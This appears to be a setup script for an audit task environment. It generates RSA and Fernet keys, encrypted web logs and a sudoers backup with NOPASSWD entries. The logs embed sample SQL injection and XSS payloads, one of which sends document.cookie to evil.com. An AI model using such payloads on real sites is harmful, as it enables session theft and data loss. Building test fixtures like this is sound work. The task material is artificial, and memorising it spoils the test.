#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest cryptography

    useradd -m -s /bin/bash user || true
    mkdir -p /home/user/audit_trail

    cat << 'EOF' > /tmp/setup.py
import os
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.fernet import Fernet

os.makedirs('/home/user/audit_trail', exist_ok=True)

# 1. Generate RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)
with open('/home/user/audit_trail/private.pem', 'wb') as f:
    f.write(private_pem)

# 2. Generate Fernet Key and encrypt with RSA
fernet_key = Fernet.generate_key()
encrypted_fernet = private_key.public_key().encrypt(
    fernet_key,
    padding.PKCS1v15()
)
with open('/home/user/audit_trail/symmetric.enc', 'wb') as f:
    f.write(encrypted_fernet)

# 3. Create Logs and encrypt with Fernet
logs = [
    {"timestamp": "2023-10-01T10:00:00", "path": "/login", "payload": "admin' OR '1'='1"},
    {"timestamp": "2023-10-01T10:05:00", "path": "/search", "payload": "<script>alert(1)</script>"},
    {"timestamp": "2023-10-01T10:10:00", "path": "/index", "payload": "normal user data"},
    {"timestamp": "2023-10-01T10:15:00", "path": "/api", "payload": "1 UNION SELECT username, password FROM users"},
    {"timestamp": "2023-10-01T10:20:00", "path": "/profile", "payload": "'; DROP TABLE users;--"}, # Not in exact trigger list
    {"timestamp": "2023-10-01T10:25:00", "path": "/comments", "payload": "Great post! <script>fetch('http://evil.com?c='+document.cookie)</script>"}
]
log_text = "\n".join([json.dumps(log) for log in logs]).encode('utf-8')
f = Fernet(fernet_key)
encrypted_logs = f.encrypt(log_text)
with open('/home/user/audit_trail/logs.enc', 'wb') as file:
    file.write(encrypted_logs)

# 4. Create Sudoers Backup
sudoers_content = """
# User privilege specification
root    ALL=(ALL:ALL) ALL
admin_user ALL=(ALL) ALL
dev_lead ALL=(ALL) NOPASSWD: ALL
# test_user ALL=(ALL) NOPASSWD: ALL
ops_manager ALL=(ALL) NOPASSWD: ALL
guest ALL=(ALL) /bin/ls
"""
with open('/home/user/audit_trail/sudoers_backup', 'w') as file:
    file.write(sudoers_content.strip())
EOF

    python3 /tmp/setup.py
    rm /tmp/setup.py

    chmod -R 777 /home/user
